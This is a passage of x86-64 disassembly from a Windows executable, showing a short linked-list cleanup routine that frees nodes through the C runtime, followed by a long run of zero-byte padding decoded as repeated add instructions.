00000001400073dd  test     rbx, rbx                                        
00000001400073e0  je       0x14000742b                                      ; 0x14000742b
00000001400073e2  mov      rax, qword ptr [rbx]                            
00000001400073e5  mov      rcx, qword ptr [rbx + 8]                        
00000001400073e9  mov      qword ptr [rip + 0x4da0], rax                    ; 0x14000c190
00000001400073f0  mov      rax, qword ptr [rcx]                            
00000001400073f3  mov      rax, qword ptr [rax + 0x10]                     
00000001400073f7  call     qword ptr [rip + 0x1193]                         ; 0x140008590
00000001400073fd  mov      rcx, rax                                        
0000000140007400  test     rax, rax                                        
0000000140007403  je       0x140007416                                      ; 0x140007416
0000000140007405  mov      rdx, qword ptr [rax]                            
0000000140007408  mov      rax, qword ptr [rdx]                            
000000014000740b  mov      edx, 1                                           ; 0x1
0000000140007410  call     qword ptr [rip + 0x117a]                         ; 0x140008590
0000000140007416  mov      rcx, rbx                                        
0000000140007419  call     qword ptr [rip + 0xfd9]                          ; 0x1400083f8 api-ms-win-crt-heap-l1-1-0.dll!free
000000014000741f  mov      rbx, qword ptr [rip + 0x4d6a]                    ; 0x14000c190
0000000140007426  test     rbx, rbx                                        
0000000140007429  jne      0x1400073e2                                      ; 0x1400073e2
000000014000742b  add      rsp, 0x20                                        ; 0x20
000000014000742f  pop      rbx                                             
0000000140007430  ret                                                      
0000000140007431  add      byte ptr [rax], al                              
0000000140007433  add      byte ptr [rax], al                              
0000000140007435  add      byte ptr [rax], al                              
0000000140007437  add      byte ptr [rax], al                              
0000000140007439  add      byte ptr [rax], al                              
000000014000743b  add      byte ptr [rax], al                              
000000014000743d  add      byte ptr [rax], al                              
000000014000743f  add      byte ptr [rax], al                              
0000000140007441  add      byte ptr [rax], al                              
0000000140007443  add      byte ptr [rax], al                              
0000000140007445  add      byte ptr [rax], al                              
0000000140007447  add      byte ptr [rax], al                              
0000000140007449  add      byte ptr [rax], al                              
000000014000744b  add      byte ptr [rax], al                              
000000014000744d  add      byte ptr [rax], al                              
000000014000744f  add      byte ptr [rax], al                              
0000000140007451  add      byte ptr [rax], al                              
0000000140007453  add      byte ptr [rax], al                              
0000000140007455  add      byte ptr [rax], al                              
0000000140007457  add      byte ptr [rax], al                              
0000000140007459  add      byte ptr [rax], al                              
000000014000745b  add      byte ptr [rax], al                              
000000014000745d  add      byte ptr [rax], al                              
000000014000745f  add      byte ptr [rax], al                              
0000000140007461  add      byte ptr [rax], al                              
0000000140007463  add      byte ptr [rax], al                              
0000000140007465  add      byte ptr [rax], al                              
0000000140007467  add      byte ptr [rax], al                              
0000000140007469  add      byte ptr [rax], al                              
000000014000746b  add      byte ptr [rax], al                              
000000014000746d  add      byte ptr [rax], al                              
000000014000746f  add      byte ptr [rax], al                              
0000000140007471  add      byte ptr [rax], al                              
0000000140007473  add      byte ptr [rax], al                              
0000000140007475  add      byte ptr [rax], al                              
0000000140007477  add      byte ptr [rax], al                              
0000000140007479  add      byte ptr [rax], al                              
000000014000747b  add      byte ptr [rax], al                              
000000014000747d  add      byte ptr [rax], al                              
000000014000747f  add      byte ptr [rax], al                              
0000000140007481  add      byte ptr [rax], al                              
0000000140007483  add      byte ptr [rax], al                              
0000000140007485  add      byte ptr [rax], al                              
0000000140007487  add      byte ptr [rax], al                              
0000000140007489  add      byte ptr [rax], al                              
000000014000748b  add      byte ptr [rax], al                              
000000014000748d  add      byte ptr [rax], al                              
000000014000748f  add      byte ptr [rax], al                              
0000000140007491  add      byte ptr [rax], al                              
0000000140007493  add      byte ptr [rax], al                              
0000000140007495  add      byte ptr [rax], al                              
0000000140007497  add      byte ptr [rax], al                              
0000000140007499  add      byte ptr [rax], al                              
000000014000749b  add      byte ptr [rax], al                              
000000014000749d  add      byte ptr [rax], al                              
000000014000749f  add      byte ptr [rax], al                              
00000001400074a1  add      byte ptr [rax], al                              
00000001400074a3  add      byte ptr [rax], al                              
00000001400074a5  add      byte ptr [rax], al                              
00000001400074a7  add      byte ptr [rax], al                              
00000001400074a9  add      byte ptr [rax], al                              
00000001400074ab  add      byte ptr [rax], al                              
00000001400074ad  add      byte ptr [rax], al                              
00000001400074af  add      byte ptr [rax], al                              
00000001400074b1  add      byte ptr [rax], al                              
00000001400074b3  add      byte ptr [rax], al                              
00000001400074b5  add      byte ptr [rax], al                              
00000001400074b7  add      byte ptr [rax], al                              
00000001400074b9  add      byte ptr [rax], al                              
00000001400074bb  add      byte ptr [rax], al                              
00000001400074bd  add      byte ptr [rax], al                              
00000001400074bf  add      byte ptr [rax], al                              
00000001400074c1  add      byte ptr [rax], al                              
00000001400074c3  add      byte ptr [rax], al                              
00000001400074c5  add      byte ptr [rax], al                              
00000001400074c7  add      byte ptr [rax], al                              
00000001400074c9  add      byte ptr [rax], al                              
00000001400074cb  add      byte ptr [rax], al                              
00000001400074cd  add      byte ptr [rax], al                              
00000001400074cf  add      byte ptr [rax], al                              
00000001400074d1  add      byte ptr [rax], al                              
00000001400074d3  add      byte ptr [rax], al                              
00000001400074d5  add      byte ptr [rax], al                              
00000001400074d7  add      byte ptr [rax], al                              
00000001400074d9  add      byte ptr [rax], al                              
00000001400074db  add      byte ptr [rax], al                              
00000001400074dd  add      byte ptr [rax], al                              
00000001400074df  add      byte ptr [rax], al                              
00000001400074e1  add      byte ptr [rax], al                              
00000001400074e3  add      byte ptr [rax], al                              
00000001400074e5  add      byte ptr [rax], al                              
00000001400074e7  add      byte ptr [rax], al                              
00000001400074e9  add      byte ptr [rax], al                              
00000001400074eb  add      byte ptr [rax], al                              
00000001400074ed  add      byte ptr [rax], al                              
00000001400074ef  add      byte ptr [rax], al                              
00000001400074f1  add      byte ptr [rax], al                              
00000001400074f3  add      byte ptr [rax], al                              
00000001400074f5  add      byte ptr [rax], al                              
00000001400074f7  add      byte ptr [rax], al                              
00000001400074f9  add      byte ptr [rax], al                              
00000001400074fb  add      byte ptr [rax], al                              
00000001400074fd  add      byte ptr [rax], al                              
00000001400074ff  add      byte ptr [rax], al                              
0000000140007501  add      byte ptr [rax], al                              
0000000140007503  add      byte ptr [rax], al                              
0000000140007505  add      byte ptr [rax], al                              
0000000140007507  add      byte ptr [rax], al                              
0000000140007509  add      byte ptr [rax], al                              
000000014000750b  add      byte ptr [rax], al                              
000000014000750d  add      byte ptr [rax], al                              
000000014000750f  add      byte ptr [rax], al                              
0000000140007511  add      byte ptr [rax], al                              
0000000140007513  add      byte ptr [rax], al                              
0000000140007515  add      byte ptr [rax], al                              
0000000140007517  add      byte ptr [rax], al                              
0000000140007519  add      byte ptr [rax], al                              
000000014000751b  add      byte ptr [rax], al                              
000000014000751d  add      byte ptr [rax], al                              
000000014000751f  add      byte ptr [rax], al                              
0000000140007521  add      byte ptr [rax], al                              
0000000140007523  add      byte ptr [rax], al                              
0000000140007525  add      byte ptr [rax], al                              
0000000140007527  add      byte ptr [rax], al                              
0000000140007529  add      byte ptr [rax], al                              
000000014000752b  add      byte ptr [rax], al                              
000000014000752d  add      byte ptr [rax], al                              
000000014000752f  add      byte ptr [rax], al                              
0000000140007531  add      byte ptr [rax], al                              
0000000140007533  add      byte ptr [rax], al                              
0000000140007535  add      byte ptr [rax], al                              
0000000140007537  add      byte ptr [rax], al                              
0000000140007539  add      byte ptr [rax], al                              
000000014000753b  add      byte ptr [rax], al                              
000000014000753d  add      byte ptr [rax], al                              
000000014000753f  add      byte ptr [rax], al                              
0000000140007541  add      byte ptr [rax], al                              
0000000140007543  add      byte ptr [rax], al                              
0000000140007545  add      byte ptr [rax], al                              
0000000140007547  add      byte ptr [rax], al                              
0000000140007549  add      byte ptr [rax], al                              
000000014000754b  add      byte ptr [rax], al                              
000000014000754d  add      byte ptr [rax], al                              
000000014000754f  add      byte ptr [rax], al                              
0000000140007551  add      byte ptr [rax], al                              
0000000140007553  add      byte ptr [rax], al                              
0000000140007555  add      byte ptr [rax], al                              
0000000140007557  add      byte ptr [rax], al                              
0000000140007559  add      byte ptr [rax], al                              
000000014000755b  add      byte ptr [rax], al                              
000000014000755d  add      byte ptr [rax], al                              
000000014000755f  add      byte ptr [rax], al                              
0000000140007561  add      byte ptr [rax], al                              
0000000140007563  add      byte ptr [rax], al                              
0000000140007565  add      byte ptr [rax], al                              
0000000140007567  add      byte ptr [rax], al                              
0000000140007569  add      byte ptr [rax], al                              
000000014000756b  add      byte ptr [rax], al                              
000000014000756d  add      byte ptr [rax], al                              
000000014000756f  add      byte ptr [rax], al                              
0000000140007571  add      byte ptr [rax], al                              
0000000140007573  add      byte ptr [rax], al                              
0000000140007575  add      byte ptr [rax], al                              
0000000140007577  add      byte ptr [rax], al                              
0000000140007579  add      byte ptr [rax], al                              
000000014000757b  add      byte ptr [rax], al                              
000000014000757d  add      byte ptr [rax], al                              
000000014000757f  add      byte ptr [rax], al                              
0000000140007581  add      byte ptr [rax], al                              
0000000140007583  add      byte ptr [rax], al                              
0000000140007585  add      byte ptr [rax], al                              
0000000140007587  add      byte ptr [rax], al                              
0000000140007589  add      byte ptr [rax], al                              
000000014000758b  add      byte ptr [rax], al                              
000000014000758d  add      byte ptr [rax], al                              
000000014000758f  add      byte ptr [rax], al                              
0000000140007591  add      byte ptr [rax], al                              
0000000140007593  add      byte ptr [rax], al                              
0000000140007595  add      byte ptr [rax], al                              
0000000140007597  add      byte ptr [rax], al                              
0000000140007599  add      byte ptr [rax], al                              
000000014000759b  add      byte ptr [rax], al                              
000000014000759d  add      byte ptr [rax], al                              
000000014000759f  add      byte ptr [rax], al                              
00000001400075a1  add      byte ptr [rax], al                              
00000001400075a3  add      byte ptr [rax], al                              
00000001400075a5  add      byte ptr [rax], al                              
00000001400075a7  add      byte ptr [rax], al                              
00000001400075a9  add      byte ptr [rax], al                              
00000001400075ab  add      byte ptr [rax], al                              
00000001400075ad  add      byte ptr [rax], al                              
00000001400075af  add      byte ptr [rax], al                              
00000001400075b1  add      byte ptr [rax], al                              
00000001400075b3  add      byte ptr [rax], al                              
00000001400075b5  add      byte ptr [rax], al                              
00000001400075b7  add      byte ptr [rax], al                              
00000001400075b9  add      byte ptr [rax], al                              
00000001400075bb  add      byte ptr [rax], al                              
00000001400075bd  add      byte ptr [rax], al                              
00000001400075bf  add      byte ptr [rax], al                              
00000001400075c1  add      byte ptr [rax], al                              
00000001400075c3  add      byte ptr [rax], al                              
00000001400075c5  add      byte ptr [rax], al                              
00000001400075c7  add      byte ptr [rax], al                              
00000001400075c9  add      byte ptr [rax], al                              
00000001400075cb  add      byte ptr [rax], al                              
00000001400075cd  add      byte ptr [rax], al                              
00000001400075cf  add      byte ptr [rax], al                              
00000001400075d1  add      byte ptr [rax], al                              
00000001400075d3  add      byte ptr [rax], al                              
00000001400075d5  add      byte ptr [rax], al                              
00000001400075d7  add      byte ptr [rax], al                              
00000001400075d9  add      byte ptr [rax], al                              
00000001400075db  add      byte ptr [rax], al                              
00000001400075dd  add      byte ptr [rax], al                              
00000001400075df  add      byte ptr [rax], al                              
00000001400075e1  add      byte ptr [rax], al                              
00000001400075e3  add      byte ptr [rax], al                              
00000001400075e5  add      byte ptr [rax], al                              
00000001400075e7  add      byte ptr [rax], al                              
00000001400075e9  add      byte ptr [rax], al                              
00000001400075eb  add      byte ptr [rax], al                              
00000001400075ed  add      byte ptr [rax], al                              
00000001400075ef  add      byte ptr [rax], al                              
00000001400075f1  add      byte ptr [rax], al                              
00000001400075f3  add      byte ptr [rax], al                              
00000001400075f5  add      byte ptr [rax], al                              
00000001400075f7  add      byte ptr [rax], al                              
00000001400075f9  add      byte ptr [rax], al                              
00000001400075fb  add      byte ptr [rax], al                              
00000001400075fd  add      byte ptr [rax], al                              
00000001400075ff  .byte    0x00                                            
